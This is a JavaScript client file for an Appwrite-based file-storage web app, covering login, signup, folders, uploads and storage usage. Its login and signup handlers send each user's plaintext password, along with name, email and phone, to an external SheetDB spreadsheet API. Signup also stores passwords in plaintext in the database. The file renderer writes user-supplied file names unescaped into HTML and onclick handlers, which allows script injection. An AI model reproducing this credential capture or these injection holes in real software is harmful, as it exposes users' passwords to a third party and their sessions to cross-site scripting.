// ======================================================
// STORAGE TASKS - FINAL INTEGRATED APP.JS
// ======================================================

const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',   
    BUCKET_ID: 'taskfiles'
};
const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

let currentUser = null;
let currentFolderId = 'root';
let currentFolderName = "Drive";

const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// === OTENTIKASI & EXCEL ===
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let identifier = el('loginEmail').value.trim(); 
        const password = el('loginPass').value;
        showLoading();
        try {
            if (!identifier.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', identifier)]);
                if (res.total === 0) throw new Error("Username tidak ditemukan.");
                identifier = res.documents[0].email;
            }
            await account.createEmailPasswordSession(identifier, password);
            currentUser = await account.get();
            fetch(`${SHEETDB_API}?sheet=Login`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: [{ "ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": password, "Riwayat Waktu": new Date().toLocaleString('id-ID') }]}) });
            checkSession(); 
        } catch (error) { alert("Gagal: " + error.message); hideLoading(); }
    });
}

if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; const email = el('regEmail').value;
        const phone = el('regPhone').value; const pass = el('regPass').value;
        if (pass !== el('regVerify').value) return alert("Password tidak sama!");
        showLoading();
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone, password: pass });
            fetch(`${SHEETDB_API}?sheet=SignUp`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: [{ "ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString('id-ID') }]}) });
            alert("Daftar Berhasil!"); nav('loginPage');
        } catch (error) { alert(error.message); } finally { hideLoading(); }
    });
}

if (el('logoutBtn')) {
    el('logoutBtn').addEventListener('click', async () => {
        if (!confirm("Keluar?")) return;
        showLoading();
        try {
            const user = await account.get();
            await fetch(`${SHEETDB_API}?sheet=Logout`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: [{ "ID": user.$id, "Nama": user.name, "Email": user.email, "Riwayat Waktu": new Date().toLocaleString('id-ID') }]}) });
            await account.deleteSession('current');
        } finally { hideLoading(); alert("Logout berhasil."); nav('loginPage'); }
    });
}

// === STORAGE CALCULATION (REAL TIME) ===
async function calculateStorageUsage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('type', 'file')
        ]);
        let totalBytes = 0;
        res.documents.forEach(doc => totalBytes += (doc.size || 0));
        const mbUsed = (totalBytes / (1024 * 1024)).toFixed(2);
        const percent = Math.min((totalBytes / (2 * 1024 * 1024 * 1024)) * 100, 100);
        el('storageUsed').innerText = `${mbUsed} MB / 2 GB`;
        el('storageBar').style.width = percent + "%";
    } catch (e) { console.error(e); }
}

// === LOAD & RENDER FILES ===
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        nav('dashboardPage'); 
        updateGreeting(); 
        calculateStorageUsage();
        loadFiles('root');
    } catch (e) { nav('loginPage'); }
    finally { setTimeout(hideLoading, 500); }
}
document.addEventListener('DOMContentLoaded', checkSession);

async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid'); grid.innerHTML = '';
    const breadcrumb = document.querySelector('.breadcrumb-area');
    
    // Perbarui Judul Folder
    if(folderId === 'root') {
        updateGreeting();
    } else {
        breadcrumb.innerHTML = `<button onclick="loadFiles('root')" class="btn-pill small" style="background:rgba(255,255,255,0.2); width:auto; padding:0 15px; margin-right:10px;"><i class="fa-solid fa-arrow-left"></i> Kembali</button> <h2>${currentFolderName}</h2>`;
    }

    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('parentId', folderId)
        ]);
        res.documents.forEach(doc => renderItem(doc));
    } catch (e) { console.error(e); }
}

function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div'); div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    
    // Thumbnail Logic
    let previewContent = '';
    const fileNama = doc.nama.toLowerCase();
    
    if (isFolder) {
        previewContent = `<i class="icon fa-solid fa-folder"></i>`;
    } else if (fileNama.match(/\.(jpg|jpeg|png|gif|webp|jfif)$/)) {
        const previewUrl = storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId);
        previewContent = `<img src="${previewUrl}" class="thumb-img" alt="thumb">`;
    } else if (fileNama.match(/\.(mp4|mov|avi)$/)) {
        previewContent = `<i class="icon fa-solid fa-file-video"></i>`;
    } else {
        previewContent = `<i class="icon fa-solid fa-file-lines"></i>`;
    }

    const click = isFolder ? `openFolder('${doc.$id}', '${doc.nama}')` : `window.open('${doc.url}', '_blank')`;
    div.innerHTML = `<button class="del-btn" onclick="deleteItem('${doc.$id}','${doc.type}','${doc.fileId}')"><i class="fa-solid fa-xmark"></i></button>
        <div onclick="${click}" style="width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;">
            ${previewContent}
            <div class="item-name">${doc.nama}</div>
        </div>`;
    grid.appendChild(div);
}

// === FOLDER & UPLOAD ===
window.submitCreateFolder = async () => {
    const nama = el('newFolderName').value.trim();
    if (!nama) return;
    closeModal('folderModal'); showLoading();
    try {
        // Menggunakan 'nama' sesuai schema gambar Anda
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            nama: nama, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0
        });
        loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.submitUploadFile = async () => {
    if (!window.selectedFile) return alert("Pilih file!");
    closeModal('uploadModal'); showLoading();
    try {
        const file = window.selectedFile;
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), file);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            nama: file.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: file.size
        });
        loadFiles(currentFolderId);
        calculateStorageUsage();
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

// === UTILS ===
window.openFolder = (id, nama) => { currentFolderId = id; currentFolderName = nama; loadFiles(id); };
window.deleteItem = async (id, type, fileId) => {
    if (!confirm("Hapus item?")) return;
    showLoading();
    try {
        if (type === 'file') await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, id);
        loadFiles(currentFolderId);
        calculateStorageUsage();
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};
window.nav = (pageId) => { ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden')); el(pageId).classList.remove('hidden'); };
window.openModal = (id) => { el(id).classList.remove('hidden'); el('dropdownMenu').classList.remove('show'); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => openModal('uploadModal');
window.createFolder = () => openModal('folderModal');
window.toggleDropdown = () => el('dropdownMenu').classList.toggle('show');
window.togglePass = (id, icon) => { const i = el(id); i.type = i.type==='password'?'text':'password'; icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash'); };
function updateGreeting() { const h = new Date().getHours(); let s = "Morning"; if(h>=12) s="Afternoon"; if(h>=18) s="Night"; el('welcomeText').innerText = `Welcome In Drive ${s}`; }
el('dropZone').addEventListener('dragover', (e) => { e.preventDefault(); });
el('dropZone').addEventListener('drop', (e) => { e.preventDefault(); handleFileSelect(e.dataTransfer.files[0]); });
el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
function handleFileSelect(f) { window.selectedFile = f; el('fileInfoText').innerText = `File: ${f.name}`; }
el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));
